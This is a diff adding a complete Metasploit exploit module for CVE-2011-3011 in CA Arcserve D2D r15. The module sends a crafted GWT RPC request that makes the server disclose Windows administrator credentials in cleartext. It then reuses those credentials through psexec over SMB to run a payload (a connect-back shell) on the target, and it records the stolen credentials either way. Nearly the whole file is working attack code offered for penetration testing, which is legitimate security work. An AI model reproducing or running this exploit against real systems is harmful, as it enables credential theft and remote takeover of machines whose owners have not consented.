@@ -1,0 +1,204 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'CA Arcserve D2D GWT RPC Credential Information Disclosure',
+      'Description'    => %q{
+          This module exploits an information disclosure vulnerability in the CA Arcserve
+        D2D r15 web server. The information disclosure can be triggered by sending a
+        specially crafted RPC request to the homepage servlet. This causes CA Arcserve to
+        disclosure the username and password in cleartext used for authentication. This
+        username and password pair are Windows credentials with Administrator access.
+      },
+      'Author'         =>
+        [
+          'bannedit', # metasploit module
+          'rgod', # original public exploit
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2011-3011' ],
+          [ 'OSVDB', '74162' ],
+          [ 'EDB', '17574' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'process'
+        },
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'Space'    => 1000,
+          'BadChars' => "\x00\x0d\x0a"
+        },
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [ 'Automatic', { } ],
+        ],
+      'DisclosureDate' => 'Jul 25 2011',
+      'DefaultTarget' => 0))
+
+
+    register_options(
+      [
+        Opt::RPORT(8014),
+      ], self.class )
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: fullname,
+      post_reference_name: self.refname,
+      private_data: opts[:password],
+      origin_type: :service,
+      private_type: :password,
+      username: opts[:user]
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: opts[:status],
+      last_attempted_at: DateTime.now
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def exploit
+    print_status("Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}")
+
+    data  = "5|0|4|"
+    data << "http://#{datastore['RHOST']}:#{datastore['RPORT']}"
+    data << "/contents/"
+    data << "|2C6B33BED38F825C48AE73C093241510|"
+    data << "com.ca.arcflash.ui.client.homepage.HomepageService"
+    data << "|getLocalHost|1|2|3|4|0|"
+
+    cookie = "donotshowgettingstarted=%7B%22state%22%3Atrue%7D"
+
+    res = send_request_raw({
+      'uri'     => '/contents/service/homepage',
+      'version' => '1.1',
+      'method'  => 'POST',
+      'cookie'  => cookie,
+      'data'    => data,
+      'headers' =>
+      {
+        'Content-Type'  => "text/x-gwt-rpc; charset=utf-8",
+        'Content-Length' => data.length
+      }
+    }, 5)
+
+    if not res
+      fail_with(Failure::NotFound, 'The server did not respond to our request')
+    end
+
+    resp = res.to_s.split(',')
+
+    user_index = resp.index("\"user\"")
+    pass_index = resp.index("\"password\"")
+
+    if user_index.nil? and pass_index.nil?
+      # Not a vulnerable server (blank user/pass doesn't help us)
+      fail_with(Failure::NotFound, 'The server did not return credentials')
+    end
+
+    user = resp[user_index+1].gsub(/\"/, "")
+    pass = ""
+
+    if pass_index
+      pass = resp[pass_index+1].gsub(/\"/, "")
+    end
+
+    srvc = {
+        :host   => datastore['RHOST'],
+        :port   => datastore['RPORT'],
+        :proto  => 'tcp',
+        :name   => 'http',
+        :info   => res.headers['Server'] || ""
+      }
+    report_service(srvc)
+    if user.nil? or pass.nil?
+      print_error("Failed to collect the username and password")
+      return
+    end
+
+    print_good("Collected credentials User: '#{user}' Password: '#{pass}'")
+
+    # try psexec on the remote host
+    psexec = framework.exploits.create("windows/smb/psexec")
+    psexec.register_parent(self)
+
+    psexec.datastore['PAYLOAD'] = self.datastore['PAYLOAD']
+
+    if self.datastore['LHOST'] and self.datastore['LPORT']
+      psexec.datastore['LHOST'] = self.datastore['LHOST']
+      psexec.datastore['LPORT'] = self.datastore['LPORT']
+    end
+
+    psexec.datastore['RHOST'] = self.datastore['RHOST']
+
+    psexec.datastore['DisablePayloadHandler'] = true
+    psexec.datastore['SMBPass'] = pass
+    psexec.datastore['SMBUser'] = user
+
+    print_status("Attempting to login via windows/smb/psexec")
+
+    # this is kind of nasty would be better to split psexec code out to a mixin (on the TODO List)
+    begin
+      psexec.exploit_simple(
+        'LocalInput'  => self.user_input,
+        'LocalOutput' => self.user_output,
+        'Payload'  => psexec.datastore['PAYLOAD'],
+        'RunAsJob' => true
+      )
+    rescue
+      report_cred(
+        ip: datastore['RHOST'],
+        port: 445,
+        service_name: 'smb',
+        user: user,
+        password: pass,
+        status: Metasploit::Model::Login::Status::INCORRECT
+      )
+
+      print_status("Login attempt using windows/smb/psexec failed")
+      print_status("Credentials have been stored and may be useful for authentication against other services.")
+      # report the auth
+      return
+    end
+
+    # report the auth
+    report_cred(
+      ip: datastore['RHOST'],
+      port: 445,
+      service_name: 'smb',
+      user: user,
+      password: pass,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
+    )
+
+    handler
+  end
+end
